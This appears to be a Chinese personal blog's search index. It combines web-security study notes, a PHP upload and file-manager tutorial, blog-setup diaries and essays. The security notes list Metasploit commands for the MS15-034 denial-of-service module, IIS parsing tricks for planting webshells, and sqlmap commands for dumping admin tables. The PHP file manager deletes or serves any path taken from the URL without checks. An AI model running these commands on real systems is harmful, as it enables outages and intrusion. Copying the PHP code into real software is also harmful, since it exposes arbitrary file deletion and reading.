（Range字段值的含义。18446744073709551615转为十六进制是 0xFFFFFFFFFFFFFFFF(16个F），是64位无符号整型所能表达的最大整数，整数溢出和这个超大整数有关。） 返回的TITLE中为Requested Range Not Satisfiable 则表示目标存在HTTP.SYS漏洞；如果返回的是Bad Request则表示该漏洞不存在； 192.xxx.137.xxx:为目标主机IP地址 漏洞复现使用msf &gt; 后续会经常用到的工具 123456789msfconsole //打开msfsearch ms15-034 //查询该漏洞auxiliary/dos/http/ms15_034_ulonglongadd //使用模块攻击use auxiliary/dos/http/ms15_034_ulonglongaddshow optionsset rhosts 192.xxx.137.xxxset rport xxrun 不能乱用：破环计算机罪IIS短文件漏洞漏洞描述此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。 漏洞成因为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名，可以使用命令dir /x 应用场景后台路径获取，数据库文件获取，其他敏感文件获取（探针只显示前六位） 利用工具https://github.com/irsdl/IIS-ShortName-Scanner（Java） https://github.com/lijiejie/IIS_shortname_Scanner（python） java工具稍微好用一些 IIS文件解析IIS 6 解析漏洞比较多 &gt; 没有官方补丁1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析 2、该版本默认会将*.asp/目录下的所有文件当成Asp解析。 如：logo.asp;.jpg xx.asp/logo.jpg IIS 7.x 解析漏洞比较少 &gt; 有官方补丁在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为php文件 应用场景：配合文件上传获取Webshell 生成后门+上传文件：哥斯拉 常见情况：6版本+win2003 7&#x2F;7.5版本+win2008 现在8版本 IIS写权限几乎碰不到，非常老的漏洞。新上线的项目不可能有此漏洞。长长见识。 利用参考：https://cloud.tencent.com/developer/article/2050105 原因：搭建配置时，两处权限配置不当导致。 IIS&lt;&#x3D;6.0，目录权限开启写入，开启WebDAV，设置为允许 使用postman发送PUT请求可以写入，直接上传文件： SQLMAP使用&amp;ACCESS注入ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入。 123python sqlmap.py -u &quot;&quot; --tables //获取表名python sqlmap.py -u &quot;&quot; --cloumns -T admin //获取admin表名下的列名python sqlmap.py -u &quot;&quot; --dump -C &quot;&quot; -T admin //获取表名下的列名数据 使用上述命令，找到可用数据（admin，密码）以后 找后台： 1、短文件扫描：利用漏洞探针 2、目录扫描：字典 3、网站爬虫：获取架构中的目录和文件，分析 拿权限：上传文件 若不能轻松上传文件，可配合配置解析漏洞抓包改参数","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"关于如何科学使用外网资料与靶场","path":"/2023/06/26/杂/关于如何科学使用外网资料与靶场/","content":"终于正常了，我发现这个hexo每次新建一个文件，就要等几分钟才能输入进去中文，哪怕语言配置过了也要等……奇奇怪怪 有些外文网站的视频资源我是完全用不了啊，昨天查了一些工具，算是把听不懂看不懂的问题解决了七七八八 前提：只要视频都能下载到本地。 下载本地的方法： 如果是b站视频，那么就是谷歌+油猴插件+bilibiliEvolved 先把视频下载下来。 如果是油管，那么我还没试过…之后有空去看看怎么搞，但应该都差不多 视频在本地以后，使用剪映专业版的自动识别语音转字幕+字幕提取工具提出来是srt格式+网易见外翻译（2M以内） 最后使用视频播放器打开就行 之前还使用过potplayer自动翻译，完全不行，没有任何变化。 还有Github上一个自动翻译软件，写的挺好的，没有发行版，从云端构建了一晚上还没好，真绝了，CI构建也懒得试了。 最后还是剪映最香啊… hackthebox订阅有学生优惠，一个月看起来会优惠三四十人民币的样子，长期订阅还是比较划算的，所以有个美国edu账号又是方便很多，而且notion笔记可以免费使用，还有其他的一些学生优惠也是，不得不说这邮箱还是值得我花了130r买…过两天试试","tags":["哎就是玩"],"categories":["碎碎念"]},{"title":"关于php开发的学习","path":"/2023/06/24/杂/关于php开发的学习/","content":"出现的问题关于运算符??php中两个问号是php7新推出的一个NULL合并运算符??如果它存在且不为NULL，则返回其第一个操作数；否则，返回其第二个操作数。从左到右评估。NULL合并运算符也可以链形式使用。 例如： $a = null; var_dump($a??1); 输出1如果$a = 0; var_dump($a??1); 输出0如果是空字符串，输出也是空字符串。 黑名单、白名单、类型 过滤12345$name=$_FILES[&#x27;f&#x27;][&#x27;name&#x27;];$type=$_FILES[&#x27;f&#x27;][&#x27;type&#x27;];$size=$_FILES[&#x27;f&#x27;][&#x27;size&#x27;];$tmp_name=$_FILES[&#x27;f&#x27;][&#x27;tmp_name&#x27;];$error=$_FILES[&#x27;f&#x27;][&#x27;error&#x27;]; 黑名单机制： 12345678910$black_ext=array(&#x27;php&#x27;,&#x27;asp&#x27;,&#x27;jsp&#x27;,&#x27;aspx&#x27;);//xxx.jpg xxx.png$fenge = explode(&#x27;.&#x27;,$name);$exts = end($fenge);if(in_array($exts,$black_ext))&#123; echo &#x27;非法后缀文件&#x27;.$exts;&#125;else&#123; move_uploaded_file($tmp_name,&#x27;upload/&#x27;.$name); echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;&#125; 白名单机制： 12345678910$allow_ext=array(&#x27;png&#x27;,&#x27;jpg&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;);//xxx.jpg xxx.png$fenge = explode(&#x27;.&#x27;,$name);$exts = end($fenge);if(!in_array($exts,$allow_ext))&#123; echo &#x27;非法后缀文件&#x27;.$exts;&#125;else&#123; move_uploaded_file($tmp_name,&#x27;upload/&#x27;.$name); echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;&#125; MIME文件类型过滤： 1234567$allow_type=array(&#x27;image/png&#x27;,&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/gif&#x27;);if(!in_array($type,$allow_type))&#123; echo &#x27;非法后缀文件&#x27;;&#125;else&#123; move_uploaded_file($tmp_name,&#x27;upload/&#x27;.$name); echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;&#125; 文件管理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;文件列表&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; ul &#123; list-style: none; padding: 0; margin: 0; &#125; li &#123; margin-bottom: 10px; &#125; i &#123; margin-right: 10px; &#125; a &#123; text-decoration: none; color: #333; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;当前目录下的文件列表&lt;/h1&gt;&lt;ul&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$dir = $_GET[&#x27;path&#x27;] ?? &#x27;./&#x27;;//1.打开目录，读取文件列表 opendir//2.循环读取文件列表 while readdir//3.判断是文件还是文件夹 is_dir//打开目录，读取文件列表 opendirfunction filelist($dir)&#123; if($dh = opendir($dir))&#123; //循环读取文件列表 while readdir while(($file=readdir($dh) )!== false)&#123; //判断是文件还是文件夹 is_dir if(is_dir($file))&#123; echo &quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=$file&#x27;&gt;&quot; . $file . &#x27;&lt;/a&gt;&lt;/li&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27; . $file . &#x27;&lt;/a&gt;&lt;/li&gt;&#x27;; &#125; &#125; &#125;&#125;filelist($dir);function del($file)&#123; if(!is_dir($file))&#123; unlink($file); echo &quot;&lt;script&gt;alert(&#x27;删除成功&#x27;)&lt;/script&gt;&quot;; &#125;&#125;if(isset($_GET[&#x27;del&#x27;]))&#123; del($_GET[&#x27;del&#x27;]);&#125;function down($filepath)&#123; $fileName = basename($filepath); header(&quot;Content-Type: application/octet-stream&quot;); header(&quot;Content-Disposition: attachment; filename=\\&quot;&quot; . $fileName . &quot;\\&quot;&quot;); header(&quot;Content-Length: &quot; . filesize($filepath)); readfile($filepath);&#125;if(isset($_GET[&#x27;down&#x27;]))&#123; down($_GET[&#x27;down&#x27;]);&#125;?&gt;","tags":["php","web开发"]},{"title":"试试github+hexo搭建的博客怎么样","path":"/2023/06/24/杂/试试github-hexo搭建的博客怎么样/","content":"2023 年 6 月 24 日感觉还可以？用Typora打开无缝衔接，不过还没有选择自己喜欢的主题。之前有在阿里云捣鼓过博客什么的，但是奈何实在是太贵了，一个服务器一个月几十块，买不起，试用一下就行，不过倒是可以搞一下个人域名配置，之前那国内服务器还去备案过，现在也已经快过期了。学习使用还是香港服务器按照分钟计算最划算。hexo new newpapernamehexo cleanhexo generatehexo deploy关于hexo还需要把配置文件改了什么的。刚发现一款还可以的主题 https://github.com/hooozen/hexo-theme-tranquility下载试试，问题就是这个Github实在是卡的断断续续，什么时候能实现科学上网还需要研究一下……2023 年 6 月 25 日当天晚上就下载了clash，碰巧找到个免费节点600M，试了一下香港ip网速都快的飞起，真绝了，用微信打开微博都快了好多……等之后用完去订阅一下就行~后面似乎还要再把博客配置一些小细节改一下，但是先不急了，先还是继续学几天web开发吧，真是进度缓慢呐…2024 年 7 月 13 日过了一年，今天换了一个主题，灵活度很高，组件系统我很喜欢。这一年英语小有进步。还有去年买的clash，130G现在还剩了123G，哈哈哈哈哈，流量费的真慢啊…Verge版本倒是越来越好用了！2024 年 7 月 16 日timeline 时间线似乎是主题里非常好用的一个功能，但是目前我还没有看懂怎么用的。下面是官方文档，之后研究一下：https://docs.github.com/en/rest/issues/issues?apiVersion=2022-11-28#list-issues-assigned-to-the-authenticated-usermarkdown软件也换成了marktext开源的，之前typora一直让我买正版，最后非会员只能打开一个md文档……emmm2024 年 7 月 23 日昨天就发现静态时间线超级简单，非常适合我这篇博客碎碎念的格式。目前还剩动态时间线，但是因为前一个主题的缘故，目前也有点思路。考虑要不要把每日做了什么的放进一个这样的文档当作月度总结？之后找找格式。似乎是不错的自我归纳方式…除了动态时间线，还剩下文档系统和笔记栏目以及友链没有配置，小组件也没用搞清楚，争取新年前把博客彻底做美化。","tags":["哎就是玩","博客搭建"],"categories":["杂"]},{"title":"西西弗斯神话李玉民版-阅读笔记","path":"/2021/04/18/阅读/西西弗斯神话李玉民版阅读笔记/","content":"首先说我是业余爱好的，加缪的书也并非很好读，我只是一个复读机，用自己的话把他的内容复述一遍，加深理解。有不正确的地方，欢迎指正。 第一部荒诞推理第一节荒诞与自杀第一节是整个推理的序章，从自杀开始谈起，在加缪看来，“真正严肃的哲学命题只有一个，那就是自杀”。 人为何自杀？——认为生命不值得活。 引出紧迫的问题：生命意义的问题 在加缪看来，那些关于客观物理的问题，比如，本体论(研究世界本质，地球围着太阳还是太阳围着地球)的问题或者以往哲学一直探讨的那些问题没有这个问题紧迫，因为那些问题不会引人而死，就算不解也无关紧要不妨碍人们继续活着。 不探讨社会学的意义，仅仅就个人思想与自杀的关系。答案是什么？——生活不值得活着，没有活在世上的深刻理由，每天发生的很多事是很荒谬的。 解释荒诞感——举例……以下是原文。 世外人举例——《局外人》情节 流放感举例——《鼠疫》情节 演员和舞台——戏剧本书第二部论述例子 大多数人在面对世界荒诞的前提下是如何做出行动的？—— 1.表里如一的人，问是否自杀？问题没这么简单。大多数人是2和3。2.提出问题，没有回答3.宣扬的哲学理论和行动不符 大多数人都是矛盾的。为何矛盾？某种思想 引出第三个主题——“闪避死亡”也就是希望。给生活赋予什么高大上的意义，或者超越生活，总之不是为了活着本身，加缪不认同这种做法，认为这样是背叛了人生。 问题：荒谬真的导致自杀吗？ 需要排除一切都干扰因素，例如人混乱的激情和非理性然后继续加缪的推理。答案是否定的。 这是最后一段，极具文学性的描述。 他认为做法应该是坚持并且观察这种荒诞，但，总归我们都应该坚持下去，荒诞其实并不会引我们进入自杀。 最后一句——荒诞(1)，希望(2)，死亡(2)这三者都只是演员，局中人自然是充满了非理性的，只有坚持和洞察才是非常理性的有逻辑的作为观察者看清究竟发生了什么。荒诞是一个起点和开始，希望和死亡都是可能是行为，加缪本人不认可这样的行为。 最后一句是在说这本书后面具体的概括，先分析这三个主题，然后再举例子，例子放在了第二部分荒诞人。 第二节荒诞之壁(以自然段形式)第二节开头便是非常充满诗意的叙述，反复阅读多遍我对此有一些些理解，情感、激情或者非理性，这些东西我们可以把他们分析描述出来，以它们的表象或者这些非理性所激起的行为来分析。但是开头第一句便指明，分析描述出来的东西远远不止它本身所蕴含的那些……而荒诞就是某种情感，某种激情，某种非理性。 第2自然段，这种说不清道不明的荒诞感经常会被文史哲或者艺术领域表现，这些领域用自己的方式表达出来这种荒诞感，让人们见到。 第3段，大家注意第三段和第二段之间的一段空白，这是另起新的一部分内容了。荒诞起源于日常普普通通的生活，就如同那些很牛逼的文学作品开头描写是在某个街角和某个小餐厅。小栗子，“没什么”这句话很敷衍，但如果是真诚的，这代表了这人做出某个行为的无意义，被别人问到问什么，其实没有为什么，仅此而已了，大脑又得给自己的行为寻找意义，问自己为什么？这种类似的回答被加缪看作荒诞的第一个象征。 第4段，很清晰的例子。和上一个自然段衔接了逻辑，“为什么？”如此机械循环的生活。这个人开始反思自己这些究竟是为什么，这种惊讶里肯定是有厌倦这样日复一日生活的。当人厌倦生活时便开始思考这些事情，对这些事情介入了意识和观察，他觉醒了。觉醒后慢慢积累，最后要么自杀要么继续像以前日复一日。加缪认为出现厌倦是好的，因为这种感觉可以引发人们思考，这就是一切的开端，可以意识到“荒诞”。他提到作呕的说法来源于萨特的《恶心》。 日复一日—厌倦—反思—发现了荒诞 第5段，这又举了个例子，那些包含“希望”和“明天”的话，人是逐渐老去的，每个人肯定都不想老去，但精神上却又期盼着“希望”和“明天”，这也是一种荒诞。 第6段，陌生感。世界所展示的形态和人类一直探索的世界的本质(原子质子电子等等)永远是有差异的，我们就算搞清楚了原子质子电子也不可能完完全全熟悉它原原本本的样子，有时候我们在大自然面前忽然会感觉到人类的渺小。人与人之间，人与自然之间都是一个个的不同的个体，个体之间永远也做不到百分之百的彼此了解。我们有时候会忽然意识到这种彼此之间的独立性和唯一性，进而产生孤独和荒诞的感觉。 第7段，依然是荒诞的举例。“人分泌出非人性的东西。”人们面对这些非人性会很是嫌弃。从第三段到第七段，加缪都在举例荒诞感从何而来。 第8段，谈论死亡。第一节最后一段所说的另一个演员出场了。脚注里说加缪在这里谈论的死亡是受到克尔凯郭尔和海德格尔的启发。没有人经历过死亡，人们却对他恐惧，这是因为血腥“数学”。说白了就是那种实证科学，科学说清楚了人死了以后也是没有灵魂的，去不了天堂也得不到永生。 第9段，加缪感兴趣的，不是荒诞本身，荒诞只是一个开始，他对发现荒诞的后果更感兴趣。这些主题随处可见，不是他原创的，他只是把这些归类出来说一说自己对他们的认识。然后再从中得出一些问题的答案。什么问题呢？不避讳荒诞本身可以走向何方？自杀(死亡)还是希望？ 第10段(新的开始，注意中间空白)，思想的矛盾性，引用亚里士多德的论述： 第11段，反思和上一段的那种谬误一样，充满了矛盾。批判了现象学，认为有些学者总是在追求某种统一的东西，对某种绝对或者永恒事物的追求。所追求的这种统一本身其实就是一种矛盾，加缪不认可。 第12段到15段，阐述人自以为自己知道的和实际知道的有永恒的鸿沟。科学的认识并不能让我们真正的理解这个世界。我与世界产生出了陌生感。 第16段，世界是不可理喻的，荒诞存在于人和世界之间。理性显得特别矛盾，上述论证了。那思想究竟怎么办呢？ 第17段，新开头，过渡段，说思想提出了几个问题。 第18到19段，荒诞是某种激情，问题，人能否与荒诞的激情共生存？有几位哲学家的思想可以看看他们的共同性。他们都认为世界有这样的特点：“这个世界难以描绘……” 第20段：海德格尔。 第21段：雅斯贝尔斯。 第22段：舍斯托夫。 第23段：克尔凯郭尔。 第24段：方法-胡塞尔等。 第25段：总结上述这些思想，并且点题：“什么也不明确，一切都混乱不堪，人仅仅保留了自己的明确以及对围墙的真切认识。” 第26段：人生悲剧的三个特点：非理性、人的怀念之情，这两者之间的冲撞产生的荒诞。","tags":["read","philosophy"],"categories":["Read"]},{"title":"中二之龙战骑士","path":"/2017/04/21/胡言乱语/中二之龙战骑士/","content":"今夜很美。头顶上闪烁的孤星还有组合的北斗七星、忽明忽暗的飞机、隐约可见的云。很久很久我都不再抬头认真观望夜空了。 五年级的音乐课，陈老师规定的音乐考试形式为自由组合唱一首歌或者单人表演乐器之类的都可以。 我和同年同日认得哥还有他的好基友三个人一起排练——牛仔很忙。我征得爸爸的同意，打开我们家第一台电脑搜索这首歌曲，想把它的歌词抄下来。 2分48秒结束后随机播放到周董的新专辑。开头的气势磅礴顿时吸引我。龙战骑士。我的注意力顿时被这首歌全部吸引过去。神圣的把它抄下来。歌词很迷人。 至此以后，我时不时就从笔袋将它拿出来看。上课下课学校家中。仿佛是《圣经》一般。那个时候我真觉得，这个世界上一定有龙。 之后的生日上，我获得了一支看起来很贵重的钢笔。不知从哪里翻出来一个黑色硬皮本，新世界即将到来。耳边环绕的是F.I.R.《流浪者之歌》。 那个时候我常常望着窗外，望着天空，一望就是好几个小时。心中信仰着在不为人知的某处一定有不同于我们人类的文明。 到现在我依然可以记得那个世界，它和我同步更新，最早的历史虽然模糊甚至忘却，但依然无法否认它们曾经存在过。 林千雪、沈蔚濯、正天宇、陆家、沈家、三人帮、七星审判、龙迹、黑色星期天、忏魂曲……至今他们陪伴了我将近十年。 初一二的时候偶然间接触到些许神秘学和部分神奇的力量与人群。我的世界飞速发展。我在“异城”呆了两年。那两年对我今后都有深远的影响和发展。 2012年12月13日。妈妈送给我一件生日礼物——《苏菲的世界》。另一个世界的大门又向我敞开更多的一点。兴奋、紧张、愉悦、震撼包围了我。 到现在我的手边是赵林老师的西哲史讲演录以及张志伟老师的十五讲。过去和现在甚至是将来串成了一条线。 上个寒假我在初中用的MP4中找到了当年的历史。我描绘的《龙迹》、关于末日的说法、术法、一些稀奇古怪东西…再一次遇见他们，熟悉而又陌生。我将他们珍藏起来。 此时此刻。“对敌人谦卑，抱歉我不会，而远方龙战于野，咆哮声不自觉，横越过了几条街，我坚决 冲破这一场浩劫……”“谁淌血我却只为，拯救你的无邪，城墙上我在等魔坠，火焰吞噬无名碑，摧毁却无法击溃，我要爱上谁……” 嘛，就这么一如既往的中二下去吧。 如果我能踏足那个世界，碎尸万段再所不惜。 p.s. bgm:深澤秀行《10th symphony type&#x2F;MOON》","tags":["铁甲依然在","随笔"],"categories":["碎碎念"]},{"title":"朋友文章","path":"/friends/rss/index.html","content":""},{"title":"python官方文档笔记-基础教程","path":"/notes/python-base.html","content":"1. 课前甜点 shell 脚本擅长的是移动文件和改变文本数据，而不适合编写 GUI 应用或游戏。 Python “可以扩展”：会开发 C 语言程序，就能快速上手为解释器增加新的内置函数或模块，不论是让核心程序以最高速度运行，还是把 Python 程序链接到只提供预编译程序的库（比如，硬件图形库）。只要下点功夫，就能把 Python 解释器和用 C 开发的应用链接在一起，用它来扩展和控制该应用。 2. 使用 Python 的解释器[这里和2.1.1传入参数暂时跳过，之后再看暂时不是特别重要] 有命令行参与：1. 命令行与环境 — Python 3.12.4 文档 如果不使用默认编码，则要声明文件的编码，文件的 第一 行（例外情况如下段shebang行）要写成特殊注释。句法如下：# -*- coding: encoding -*- 类Unix系统上，Python 脚本可以像 shell 脚本一样直接执行：#!/usr/bin/env python3 3. Python 速览主要就是数字、文本、列表。我速览，都是基础内容。 [ ] 左闭右开 -1代表最后一个字符 12345 +---+---+---+---+---+---+ | P | y | t | h | o | n | +---+---+---+---+---+---+ 0 1 2 3 4 5 6-6 -5 -4 -3 -2 -1 不可更改、不可切片赋值：字符串、元组 可以更改、切片赋值：列表（嵌套列表是多维数组） 4. 更多控制流工具","tags":[null],"categories":[null,null]},{"title":"使用说明","path":"/wiki/PythonNetTools/index.html","content":"Hello, This is the PythonNetTools.","tags":[null]},{"title":"友链","path":"/friends/index.html","content":"可能性们世界不是由个体改变的，而是由那些选择站在一起的人共同塑造的。 如何交换友链? 您的网站应满足以下全部条件： 安全合规：合法的、非营利性、无木马植入的 HTTPS 站点。 非空壳网站：网站内发布至少 五篇 原创文章，内容题材不限。 我们需要有一定的有效互动： 先友后链：与 FlowsecNagi 有至少 三次 的有效互动，例如 issue 或者评论留言。 我已满足全部条件，快告诉我如何交换友链！如果您没有满足上述条件，即时提交了申请也不会通过哦～第一步：新建 Issue新建 GitHub Issue 按照模板格式填写并提交。为了提高图片加载速度，建议优化头像：1 打开 压缩图 上传自己的头像，将图片尺寸调整到 144px 后下载。2 将压缩后的图片上传到 去不图床 或者其它稳定的图床并使用此图片链接作为头像。第二步：添加友链并等待管理员审核请添加本站到您的友链中：1234567&#123; &quot;title&quot;: &quot;FlowsecNagi&#x27;s&quot;, &quot;url&quot;: &quot;https://abckillmen.github.io/friends/&quot;, &quot;avatar&quot;: &quot;https://imgs.aixifan.com/o_1d1nid2r71o6fvko1oe2jirnm82d.jpg&quot;, &quot;screenshot&quot;: &quot;&quot;, &quot;description&quot;: &quot;某种可能性正在测试&quot;&#125;待管理员审核通过，添加了 active 标签后，回来刷新即可生效。如果您需要更新自己的友链，请直接修改 issue 内容，大约 3 分钟内生效，无需等待博客重新部署。点击这里申请友链噢~~"},{"title":"配置博客主题遇到的问题","path":"/notes/index.html","content":"豆瓣书籍页面https://abckillmen.github.io/douban/books/ 豆瓣书籍页面的左右侧边栏自定义设置问题引入插件：hexo-douban Stellar 主题版本：1.29.1 参考：苏末了 - Hexo-Stellar 展示豆瓣影评|书评|乐评 问题：豆瓣自动生成的页面似乎是直接生成进 public ，不会部署i ndex.md 了，然后写在 widgets.yml 中的自定义组件写在站点主结构树中并不加载显示… 解决：总设置 config.yml 里 douban 下的 layout 布局改成了自定义的 page ！参考官方文档后，将标签变量 customize_layout 改为 layout 豆瓣页面部署加载后为0的问题引入插件：hexo-douban Stellar 主题版本：1.29.1 参考：苏末了 - Hexo-Stellar 展示豆瓣影评|书评|乐评 问题：主题本地 public 下 html 可以正常显示豆瓣书单列表，部署后加载全是0，不再显示 解决：后来阅读 hexo-douban 官方文档发现还需要加入兼容参数：“swup: 是否兼容 swup 。支持 script 热加载，解决一些 single-page 主题的加载问题，默认 false 。” 豆瓣插件服务器崩溃后的报错提示issue链接：生成页面时报错：Unhandled rejection SyntaxError: Unexpected token &#39;&lt;&#39;, &quot;&lt;html&gt; &lt;h&quot;… is not valid JSON · Issue #178 · mythsman&#x2F;hexo-douban · GitHub 坑点：报错和问题毫不相干，常见的倒是他人也有总结，新的很容易摸不清头脑，以为是自己的问题呜呜呜 友链与朋友圈相关动态友链使用 vercel api 仍然加载缓慢的问题参考：官方文档 Stellar：数据类标签组件（6个） - XAOXUU、教程：github&#x2F;gitee issues的友链信息自动生成json及api调用 | 小冰博客 Stellar 主题版本：1.29.1 问题：参照小冰博客动态友链嫁接部署到 vercel api 仍然加载缓慢，得开梯子才可以加载成功。 解决：经过朋友圈 - 苏末了的解答，使用api:https://api.vlts.cc/output_data/v2/这个api域名即可。 朋友圈抓取其他朋友的文章失败问题插件：hexo-circle-of-friends 官方文档：Document 遇见问题：data.json文件信息开始错误 去issue查看问题：极简模式下遇到 {&quot;message&quot;: &quot;start error&quot;} 问题 · Issue #132 · Rock-Candy-Tea&#x2F;hexo-circle-of-friends · GitHub 解决抓取到的问题了：除100改为10之外还发现仓库名称填错，issues少加了一个s 抓取后还有一个问题：极简模式因range100个友链会显示message:error start抓取不到所以改成了10，终于可以爬取成功了，但在模型转换出现如下报错"}]